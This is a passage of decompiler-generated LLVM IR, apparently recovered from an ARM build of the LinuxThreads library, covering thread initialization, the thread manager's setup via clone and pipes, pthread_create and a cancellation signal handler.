  store i32 %v0_d81c, i32* %v3_d81c, align 4
  %v2_d820 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d820, i32* @r4, align 4
  store i32 %v6_d7a0, i32* @r5, align 4
  ret i32 %v0_d7f8

; uselistorder directives
  uselistorder i32 %v0_d81c, { 1, 0 }
  uselistorder i32 %v0_d818, { 1, 0 }
  uselistorder i32 68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d7f8, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  store i32 0, i32* @r0, align 4
  %v2_d84c = ptrtoint i32* %stack_var_-152 to i32
  %v0_d850 = call i32 @pthread_onexit_process()
  store i32 %v2_d84c, i32* @r5, align 4
  %v0_d858 = call i32 @__pthread_reset_main_thread()
  %v2_d85c = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_d85c, i32* @r0, align 4
  %v1_d860 = call i32 @sigemptyset(i32 %v2_d85c)
  store i32 0, i32* @r4, align 4
  %v2_d86c = load i32, i32* @global_var_2a7a8.307, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v4_d880 = call i32 @__libc_sigaction(i32 %v2_d86c, i32* nonnull %stack_var_-152, i32 0)
  %v2_d88c = load i32, i32* @global_var_2a7ac.224, align 4
  %v0_d890 = load i32, i32* @r4, align 4
  %v4_d894 = call i32 @__libc_sigaction(i32 %v2_d88c, i32* nonnull %stack_var_-152, i32 %v0_d890)
  %v2_d89c = load i32, i32* @global_var_2a7b0.202, align 4
  %v1_d8a0 = load i32, i32* @r4, align 4
  %v2_d8a0 = sub i32 %v2_d89c, %v1_d8a0
  %v4_d8a0 = xor i32 %v1_d8a0, %v2_d89c
  %v5_d8a0 = xor i32 %v2_d8a0, %v2_d89c
  %v6_d8a0 = and i32 %v5_d8a0, %v4_d8a0
  %v7_d8a0 = icmp slt i32 %v6_d8a0, 0
  %v8_d8a0 = icmp slt i32 %v2_d8a0, 0
  %v9_d8a0 = icmp eq i32 %v2_d89c, %v1_d8a0
  %v3_d8b0 = xor i1 %v8_d8a0, %v7_d8a0
  %v4_d8b0 = or i1 %v9_d8a0, %v3_d8b0
  %v5_d8b0 = xor i1 %v4_d8b0, true
  call void @__pseudo_cond_branch(i1 %v5_d8b0, i32 ptrtoint (i32* @global_var_fdc0.378 to i32))
  ret i32 %v2_d89c

; uselistorder directives
  uselistorder i32 %v2_d8a0, { 1, 0 }
  uselistorder i32 %v1_d8a0, { 1, 0, 2 }
  uselistorder i32 %v2_d89c, { 2, 4, 0, 1, 3 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
}

define i32 @pthread_initialize() local_unnamed_addr {
entry:
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4194608 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %v2_d8d0 = load i32, i32* @global_var_2b16c.177, align 4
  store i32 %v2_d8d0, i32* @r4, align 4
  %v2_d8d4 = icmp eq i32 %v2_d8d0, 0
  %v2_d8d8 = ptrtoint i32* %stack_var_-304 to i32
  br i1 %v2_d8d4, label %dec_label_pc_d8e0, label %dec_label_pc_da54

dec_label_pc_d8e0:                                ; preds = %entry
  %v2_d8e0 = ptrtoint i32* %stack_var_-4194608 to i32
  %v3_d8e4 = and i32 %v2_d8e0, -2097152
  store i32 %v3_d8e4, i32* @global_var_2b16c.177, align 4
  %v0_d8f0 = call i32 @__libc_getpid()
  %v2_d8fc = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  store i32 %v2_d8fc, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2d1cc.371 to i32), i32* bitcast (i32** @global_var_2a42c.385 to i32*), align 4
  %v0_d90c = load i32, i32* @r4, align 4
  store i32 %v0_d90c, i32* @global_var_2a8d0.387, align 4
  store i32 %v0_d8f0, i32* @global_var_2a3f4.389, align 4
  store i32 ptrtoint (i32* @global_var_2d1c8.374 to i32), i32* bitcast (i32** @global_var_2a424.390 to i32*), align 4
  %v2_d9343 = icmp eq i32 %v2_d8fc, 0
  br i1 %v2_d9343, label %dec_label_pc_d93c, label %dec_label_pc_d920

dec_label_pc_d920:                                ; preds = %dec_label_pc_d8e0, %.thread
  %v2_d92c = phi i32 [ %v3_d930, %.thread ], [ %v2_d8fc, %dec_label_pc_d8e0 ]
  %v1_d920 = add i32 %v2_d92c, 52
  %v2_d920 = inttoptr i32 %v1_d920 to i32*
  %v3_d920 = load i32, i32* %v2_d920, align 4
  %v7_d924 = icmp eq i32 %v3_d920, 1
  br i1 %v7_d924, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d920
  store i32 0, i32* %v2_d920, align 4
  %v0_d930.pre = load i32, i32* @r5, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d920, %bb
  %v0_d930 = phi i32 [ %v2_d92c, %dec_label_pc_d920 ], [ %v0_d930.pre, %bb ]
  %v1_d930 = add i32 %v0_d930, 32
  %v2_d930 = inttoptr i32 %v1_d930 to i32*
  %v3_d930 = load i32, i32* %v2_d930, align 4
  store i32 %v3_d930, i32* @r5, align 4
  %v2_d934 = icmp eq i32 %v3_d930, 0
  br i1 %v2_d934, label %dec_label_pc_d934.dec_label_pc_d93c_crit_edge, label %dec_label_pc_d920

dec_label_pc_d934.dec_label_pc_d93c_crit_edge:    ; preds = %.thread
  br label %dec_label_pc_d93c

dec_label_pc_d93c:                                ; preds = %dec_label_pc_d934.dec_label_pc_d93c_crit_edge, %dec_label_pc_d8e0
  %v2_d93c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_d93c, i32* @r4, align 4
  %v2_d948 = call i32 @getrlimit(i32 3, i32 %v2_d93c)
  %v0_d94c = call i32 @__GI_getpagesize()
  %v3_d954 = load i32, i32* %stack_var_-36, align 4
  %tmp = mul i32 %v0_d94c, -2
  %v1_d958 = add i32 %tmp, 2097152
  %tmp26 = icmp ugt i32 %v3_d954, %v1_d958
  br i1 %tmp26, label %bb24, label %.thread10

bb24:                                             ; preds = %dec_label_pc_d93c
  store i32 %v1_d958, i32* %stack_var_-36, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d93c, %bb24
  store i32 55664, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp26, i32 ptrtoint (i32* @global_var_10908.391 to i32))
  %v2_d974 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_d974, i32* @r4, align 4
  store i32 %v2_d974, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_de48.393 to i32), i32* %stack_var_-304, align 4
  store i32 %v2_d8d8, i32* @r6, align 4
  %v1_d984 = call i32 @sigemptyset(i32 %v2_d974)
  store i32 ptrtoint (i32* @global_var_2a7a8.307 to i32), i32* @r7, align 4
  %v0_d98c = load i32, i32* @r5, align 4
  %v2_d994 = load i32, i32* @global_var_2a7a8.307, align 4
  %v5_d99c = call i32 @__libc_sigaction(i32 %v2_d994, i32* nonnull %stack_var_-304, i32 %v0_d98c)
  %v2_d9a4 = load i32, i32* @global_var_2a7a8.307, align 4
  store i32 %v2_d974, i32* @r0, align 4
  store i32 56724, i32* %stack_var_-304, align 4
  %v2_d9b0 = call i32 @__GI_sigaddset(i32 %v2_d974, i32 %v2_d9a4)
  store i32 ptrtoint (i32* @global_var_2a7ac.224 to i32), i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_2a7b0.202 to i32), i32* @r8, align 4
  %v2_d9bc = load i32, i32* @global_var_2a7ac.224, align 4
  %v0_d9c4 = load i32, i32* @r5, align 4
  %v5_d9c8 = call i32 @__libc_sigaction(i32 %v2_d9bc, i32* nonnull %stack_var_-304, i32 %v0_d9c4)
  %v2_d9cc = load i32, i32* @global_var_2a7b0.202, align 4
  %tmp25 = icmp slt i32 %v2_d9cc, 1
  br i1 %tmp25, label %dec_label_pc_d9f8, label %dec_label_pc_d9d8

dec_label_pc_d9d8:                                ; preds = %.thread10
  store i32 %v2_d974, i32* @r0, align 4
  store i32 54604, i32* %stack_var_-304, align 4
  %v1_d9e4 = call i32 @sigemptyset(i32 %v2_d974)
  %v2_d9e8 = load i32, i32* @global_var_2a7b0.202, align 4
  %v0_d9f0 = load i32, i32* @r5, align 4
  %v5_d9f4 = call i32 @__libc_sigaction(i32 %v2_d9e8, i32* nonnull %stack_var_-304, i32 %v0_d9f0)
  br label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %.thread10, %dec_label_pc_d9d8
  %v2_d9f8 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_d9f8, i32* @r4, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v1_da00 = call i32 @sigemptyset(i32 %v2_d9f8)
  %v2_da04 = load i32, i32* @global_var_2a7a8.307, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v2_da0c = call i32 @__GI_sigaddset(i32 %v2_d9f8, i32 %v2_da04)
  %v0_da10 = load i32, i32* @r5, align 4
  %v5_da1c = bitcast i32* %stack_var_-164 to %_TYPEDEF_sigset_t*
  %v6_da1c = call i32 @__GI_sigprocmask(i32 %v0_da10, %_TYPEDEF_sigset_t* %v5_da1c, i32 %v0_da10)
  store i32 %v2_d9f8, i32* @r0, align 4
  %v1_da28 = call i32 @__GI_sigdelset(i32 %v2_d9f8)
  %v2_da2c = load i32, i32* @global_var_2a7ac.224, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v2_da34 = call i32 @__GI_sigaddset(i32 %v2_d9f8, i32 %v2_da2c)
  %v0_da40 = load i32, i32* @r5, align 4
  %v5_da44 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v5_da1c, i32 %v0_da40)
  %v0_da48 = load i32, i32* @r5, align 4
  %v3_da50 = call i32 @on_exit(i32 55020, i32 %v0_da48)
  br label %dec_label_pc_da54

dec_label_pc_da54:                                ; preds = %entry, %dec_label_pc_d9f8
  %.0 = phi i32 [ %v3_da50, %dec_label_pc_d9f8 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_da10, { 1, 0 }
  uselistorder i32 %v2_d9f8, { 1, 0, 3, 2, 5, 4, 7, 6, 8 }
  uselistorder i32 %v2_d974, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i1 %tmp26, { 1, 0 }
  uselistorder i32 %v1_d958, { 1, 0 }
  uselistorder i32 %v3_d930, { 1, 2, 0 }
  uselistorder i32* %stack_var_-304, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 3, 0, 7, 6, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* @global_var_2a7a8.307, { 0, 1, 2, 9, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @sigemptyset, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* @global_var_2d1c8.374, { 1, 0 }
  uselistorder label %dec_label_pc_da54, { 1, 0 }
  uselistorder label %dec_label_pc_d9f8, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_d920, { 1, 0 }
}

define i32 @__pthread_initialize_manager() local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v3_da94 = load i32, i32* @r4, align 4
  %v6_da94 = load i32, i32* @r5, align 4
  %v9_da94 = load i32, i32* @r6, align 4
  %v2_da98 = load i32, i32* @global_var_2b16c.177, align 4
  %v2_daa0 = load i32, i32* @global_var_2b180.402, align 4
  %v2_daa4 = icmp eq i32 %v2_da98, 0
  %v2_daac = ptrtoint i32* %stack_var_-172 to i32
  %v2_dab0 = inttoptr i32 %v2_daa0 to i32*
  store i32 1, i32* %v2_dab0, align 4
  store i32 55992, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_daa4, i32 ptrtoint (i32* @global_var_d8c8.403 to i32))
  store i32 ptrtoint (i32* @global_var_2f3e8.239 to i32), i32* @r4, align 4
  %v2_dabc = load i32, i32* @global_var_2f3e8.239, align 4
  %v2_dac0 = mul i32 %v2_dabc, 2
  %v1_dac4 = add i32 %v2_dac0, -32
  %v1_dac8 = call i32 @malloc(i32 %v1_dac4)
  store i32 ptrtoint (i32* @global_var_2b170.180 to i32), i32* @r5, align 4
  %v2_dad0 = icmp eq i32 %v1_dac8, 0
  store i32 %v1_dac8, i32* @global_var_2b170.180, align 4
  br i1 %v2_dad0, label %.thread3, label %dec_label_pc_dae0

.thread3:                                         ; preds = %entry
  br label %dec_label_pc_dc88

dec_label_pc_dae0:                                ; preds = %entry
  %v2_dae0 = load i32, i32* @global_var_2f3e8.239, align 4
  store i32 ptrtoint (i32* @global_var_2b174.182 to i32), i32* @r6, align 4
  %v3_dae8 = mul i32 %v2_dae0, 2
  %v4_dae8 = add i32 %v1_dac8, -32
  %v1_daec = add i32 %v4_dae8, %v3_dae8
  %v2_daf0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v1_daec, i32* @global_var_2b174.182, align 4
  %v1_daf8 = call i32 @__GI_pipe(i32 %v2_daf0)
  %v3_dafc = icmp eq i32 %v1_daf8, -1
  store i32 %v1_daf8, i32* @r4, align 4
  br i1 %v3_dafc, label %dec_label_pc_db08, label %dec_label_pc_db14

dec_label_pc_db08:                                ; preds = %dec_label_pc_dae0
  %v2_db08 = load i32, i32* @global_var_2b170.180, align 4
  store i32 %v2_db08, i32* @r0, align 4
  %v0_db0c = call i32 @free()
  br label %dec_label_pc_dbf4

dec_label_pc_db14:                                ; preds = %dec_label_pc_dae0
  %v2_db18 = load i32, i32* @global_var_2f56c.408, align 4
  %v2_db1c = icmp eq i32 %v2_db18, 0
  br i1 %v2_db1c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_db14
  store i32 %v2_db18, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a3e0 to i32), i32 412) to i32*), align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_db14, %bb
  %v3_db2c = load i32, i32* @global_var_2a57c.410, align 4
  %v2_db30 = icmp eq i32 %v3_db2c, 0
  br i1 %v2_db30, label %dec_label_pc_dbb4, label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %.thread
  %v3_db3c = load i32, i32* @global_var_2a580.412, align 4
  %v2_db40 = load i32, i32* @global_var_2f55c.213, align 4
  %v2_db44 = or i32 %v2_db40, %v3_db3c
  %v1_db48 = and i32 %v2_db44, 128
  %v2_db48 = icmp eq i32 %v1_db48, 0
  br i1 %v2_db48, label %dec_label_pc_dbb4, label %dec_label_pc_db50

dec_label_pc_db50:                                ; preds = %dec_label_pc_db38
  %v3_db58 = load i32, i32* bitcast (i32** @global_var_2a5dc.258 to i32*), align 4
  %v2_db5c = call i32 @__pthread_lock(i32 %v3_db58, i32 0)
  %v2_db60 = load i32, i32* @global_var_2b174.182, align 4
  store i32 3840, i32* @r2, align 4
  %v3_db6c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_db6c, i32* @r3, align 4
  %v2_db70 = call i32 @clone(i32 ptrtoint (i32* @global_var_b924.415 to i32), i32 %v2_db60)
  store i32 %v2_db70, i32* @r0, align 4
  %v7_db74 = icmp eq i32 %v2_db70, -1
  store i32 %v2_db70, i32* @r4, align 4
  br i1 %v7_db74, label %dec_label_pc_dba4, label %dec_label_pc_db80

dec_label_pc_db80:                                ; preds = %dec_label_pc_db50
  store i32 8, i32* @global_var_2a768.416, align 4
  %v0_db8c = load i32, i32* @r5, align 4
  store i32 %v0_db8c, i32* @global_var_2f564.215, align 4
  store i32 %v0_db8c, i32* @global_var_2a76c.419, align 4
  store i32 2049, i32* @global_var_2a5d0.420, align 4
  store i32 %v2_db70, i32* @global_var_2a5d4.189, align 4
  %v0_dba0 = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_dba4

dec_label_pc_dba4:                                ; preds = %dec_label_pc_db50, %dec_label_pc_db80
  %v3_dba4 = load i32, i32* bitcast (i32** @global_var_2a5dc.258 to i32*), align 4
  %v1_dba8 = call i32 @__pthread_unlock(i32 %v3_dba4)
  %v0_dbac = load i32, i32* @r4, align 4
  %v2_dbac = icmp eq i32 %v0_dbac, 0
  br i1 %v2_dbac, label %dec_label_pc_dbb4, label %dec_label_pc_dbd0

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_dba4, %dec_label_pc_db38, %.thread
  %v2_dbbc = load i32, i32* @global_var_2b174.182, align 4
  store i32 3840, i32* @r2, align 4
  %v3_dbc4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_dbc4, i32* @r3, align 4
  %v2_dbc8 = call i32 @clone(i32 ptrtoint (i32* @global_var_b1cc.422 to i32), i32 %v2_dbbc)
  store i32 %v2_dbc8, i32* @r4, align 4
  br label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dba4, %dec_label_pc_dbb4
  %v0_dc28 = phi i32 [ %v2_dbc8, %dec_label_pc_dbb4 ], [ %v0_dbac, %dec_label_pc_dba4 ]
  %v3_dbd0 = icmp eq i32 %v0_dc28, -1
  br i1 %v3_dbd0, label %dec_label_pc_dbd8, label %dec_label_pc_dbfc

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbd0
  %v2_dbdc = load i32, i32* @global_var_2b170.180, align 4
  store i32 %v2_dbdc, i32* @r0, align 4
  %v0_dbe0 = call i32 @free()
  %v3_dbe4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_dbe4, i32* @r0, align 4
  %v1_dbe8 = call i32 @__libc_close(i32 %v3_dbe4)
  store i32 %tmp4, i32* @r0, align 4
  %v1_dbf0 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_db08, %dec_label_pc_dbd8
  %v0_dbf4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc88

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dbd0
  %v2_dc00 = load i32, i32* @global_var_2f568.200, align 4
  %v2_dc08 = icmp eq i32 %v2_dc00, 0
  store i32 %tmp4, i32* @global_var_2a7a4.195, align 4
  %v3_dc18 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_dc18, i32* @global_var_2f570.368, align 4
  store i32 %v0_dc28, i32* @global_var_2a5d4.189, align 4
  store i32 2049, i32* @global_var_2a5d0.420, align 4
  br i1 %v2_dc08, label %dec_label_pc_dc50, label %dec_label_pc_dc34

dec_label_pc_dc34:                                ; preds = %dec_label_pc_dbfc
  %v2_dc38 = load i32, i32* @global_var_2a7b0.202, align 4
  %tmp12 = icmp slt i32 %v2_dc38, 1
  br i1 %tmp12, label %dec_label_pc_dc50, label %dec_label_pc_dc44

dec_label_pc_dc44:                                ; preds = %dec_label_pc_dc34
  %v1_dc44 = call i32 @__GI_raise(i32 %v2_dc38)
  %v0_dc48 = call i32 @_thread_self.3()
  %v1_dc4c = call i32 @__pthread_wait_for_restart_signal(i32 %v0_dc48)
  br label %dec_label_pc_dc50

dec_label_pc_dc50:                                ; preds = %dec_label_pc_dc34, %dec_label_pc_dbfc, %dec_label_pc_dc44
  br label %dec_label_pc_dc58

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc74, %dec_label_pc_dc50
  store i32 %v2_daac, i32* @r1, align 4
  %v2_dc60 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_dc60, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_dc68 = call i32 @__libc_write(i32 %v2_dc60, i32 %v2_daac)
  %v3_dc6c = icmp eq i32 %v2_dc68, -1
  br i1 %v3_dc6c, label %dec_label_pc_dc74, label %dec_label_pc_dc84

dec_label_pc_dc74:                                ; preds = %dec_label_pc_dc58
  %v0_dc74 = call i32 @__errno_location()
  %v1_dc78 = inttoptr i32 %v0_dc74 to i32*
  %v2_dc78 = load i32, i32* %v1_dc78, align 4
  %v7_dc7c = icmp eq i32 %v2_dc78, 4
  br i1 %v7_dc7c, label %dec_label_pc_dc58, label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc58, %dec_label_pc_dc74
  br label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %.thread3, %dec_label_pc_dbf4, %dec_label_pc_dc84
  %v14_dc8c = phi i32 [ %v0_dbf4, %dec_label_pc_dbf4 ], [ 0, %dec_label_pc_dc84 ], [ -1, %.thread3 ]
  store i32 %v3_da94, i32* @r4, align 4
  store i32 %v6_da94, i32* @r5, align 4
  store i32 %v9_da94, i32* @r6, align 4
  ret i32 %v14_dc8c

; uselistorder directives
  uselistorder i32 %v2_db70, { 1, 2, 0, 3 }
  uselistorder i32 %v2_daac, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32* @global_var_2a7b0.202, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder label %dec_label_pc_dc88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dc84, { 1, 0 }
  uselistorder label %dec_label_pc_dc50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbf4, { 1, 0 }
  uselistorder label %dec_label_pc_dbd0, { 1, 0 }
  uselistorder label %dec_label_pc_dba4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v2_dcdc = load i32, i32* @global_var_2a7a4.195, align 4
  %v1_dce0 = icmp slt i32 %v2_dcdc, 0
  %v2_dce4 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %tmp, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v1_dce0, label %dec_label_pc_dcfc, label %dec_label_pc_dd0c

dec_label_pc_dcfc:                                ; preds = %entry
  %v0_dcfc = call i32 @__pthread_initialize_manager()
  store i32 %v0_dcfc, i32* %r0.global-to-local, align 4
  %v1_dd00 = icmp slt i32 %v0_dcfc, 0
  br i1 %v1_dd00, label %.thread7, label %dec_label_pc_dd0c

.thread7:                                         ; preds = %dec_label_pc_dcfc
  store i32 11, i32* %r0.global-to-local, align 4
  br label %bb21

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dcfc, %entry
  %v0_dd0c = call i32 @_thread_self.3()
  store i32 %v0_dd0c, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_dd20 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v0_dd0c, i32* %stack_var_-172, align 4
  %v4_dd38 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_dd20)
  store i32 %v4_dd38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd3c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dd58, %dec_label_pc_dd0c
  store i32 %v2_dce4, i32* @r1, align 4
  %v2_dd44 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_dd44, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_dd4c = call i32 @__libc_write(i32 %v2_dd44, i32 %v2_dce4)
  store i32 %v2_dd4c, i32* %r0.global-to-local, align 4
  %v3_dd50 = icmp eq i32 %v2_dd4c, -1
  br i1 %v3_dd50, label %dec_label_pc_dd58, label %dec_label_pc_dd68

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd3c
  %v0_dd58 = call i32 @__errno_location()
  store i32 %v0_dd58, i32* %r0.global-to-local, align 4
  %v1_dd5c = inttoptr i32 %v0_dd58 to i32*
  %v2_dd5c = load i32, i32* %v1_dd5c, align 4
  %v7_dd60 = icmp eq i32 %v2_dd5c, 4
  br i1 %v7_dd60, label %dec_label_pc_dd3c, label %dec_label_pc_dd68

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd3c, %dec_label_pc_dd58
  %v0_dd68 = load i32, i32* @r4, align 4
  store i32 %v0_dd68, i32* @r0, align 4
  %v1_dd6c = call i32 @_suspend.4(i32 %v0_dd68)
  store i32 %v1_dd6c, i32* %r0.global-to-local, align 4
  %v0_dd70 = load i32, i32* @r4, align 4
  %v1_dd70 = add i32 %v0_dd70, 52
  %v2_dd70 = inttoptr i32 %v1_dd70 to i32*
  %v3_dd70 = load i32, i32* %v2_dd70, align 4
  %v2_dd74 = icmp eq i32 %v3_dd70, 0
  br i1 %v2_dd74, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_dd68
  %v3_dd7c4 = load i32, i32* %v2_dd70, align 4
  store i32 %v3_dd7c4, i32* %r0.global-to-local, align 4
  br label %bb21

bb:                                               ; preds = %dec_label_pc_dd68
  %v2_dd78 = add i32 %v0_dd70, 48
  %v3_dd78 = inttoptr i32 %v2_dd78 to i32*
  %v4_dd78 = load i32, i32* %v3_dd78, align 4
  %v3_dd7c = load i32, i32* %v2_dd70, align 4
  store i32 %v3_dd7c, i32* %r0.global-to-local, align 4
  %v2_dd80 = load i32, i32* @r8, align 4
  %v3_dd80 = inttoptr i32 %v2_dd80 to i32*
  store i32 %v4_dd78, i32* %v3_dd80, align 4
  %v20_dd88.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb21

bb21:                                             ; preds = %.thread7, %.thread, %bb
  %v20_dd88 = phi i32 [ %v3_dd7c4, %.thread ], [ %v20_dd88.pre, %bb ], [ 11, %.thread7 ]
  ret i32 %v20_dd88

; uselistorder directives
  uselistorder i32 %v2_dce4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 10, 3, 4, 5, 8, 6, 7, 9, 0 }
  uselistorder i32 (i32)* @_suspend.4, { 1, 0 }
  uselistorder i32 ()* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %bb21, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dd68, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_dd90 = call i32 @pthread_initialize()
  ret i32 %v0_dd90
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dd94 = load i32, i32* @r4, align 4
  store i32 %v3_dd94, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_dd9c = call i32 @_thread_self.3()
  store i32 %v0_dd9c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a5c0.184 to i32), i32* %r2.global-to-local, align 4
  %v9_dda4 = icmp eq i32 %v0_dd9c, ptrtoint (i32* @global_var_2a5c0.184 to i32)
  br i1 %v9_dda4, label %dec_label_pc_ddac, label %dec_label_pc_ddb8

dec_label_pc_ddac:                                ; preds = %entry
  %v0_ddac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ddac, i32* @r0, align 4
  %v2_ddb0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ddb0, i32* @r4, align 4
  %v1_ddb4 = call i32 @__pthread_manager_sighandler(i32 %v0_ddac)
  store i32 %v1_ddb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ddb8

dec_label_pc_ddb8:                                ; preds = %entry, %dec_label_pc_ddac
  %v9_ddf8 = phi i32 [ %v0_dd9c, %entry ], [ %v1_ddb4, %dec_label_pc_ddac ]
  %v2_ddbc = load i32, i32* @global_var_2b178.252, align 4
  store i32 %v2_ddbc, i32* %r3.global-to-local, align 4
  %v2_ddc0 = icmp eq i32 %v2_ddbc, 0
  br i1 %v2_ddc0, label %dec_label_pc_ddf0, label %dec_label_pc_ddc8

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_ddb8
  %v2_ddcc = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 %v2_ddcc, i32* %r3.global-to-local, align 4
  %v9_ddd0 = icmp eq i32 %v9_ddf8, %v2_ddcc
  br i1 %v9_ddd0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_ddc8
  %v4_ddd4 = load i32, i32* @global_var_2a5d4.189, align 4
  store i32 %v4_ddd4, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_ddc8, %bb
  call void @__pseudo_cond_branch(i1 %v9_ddd0, i32 ptrtoint (i32* @global_var_cec0.431 to i32))
  store i32 ptrtoint (i32* @global_var_2b17c.254 to i32), i32* %r3.global-to-local, align 4
  %v2_dde8 = load i32, i32* @global_var_2b17c.254, align 4
  store i32 %v2_dde8, i32* %r0.global-to-local, align 4
  %v1_ddec = call i32 @__GI__exit(i32 %v2_dde8)
  unreachable

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_ddb8
  %v1_ddf0 = add i32 %v9_ddf8, 66
  %v2_ddf0 = inttoptr i32 %v1_ddf0 to i8*
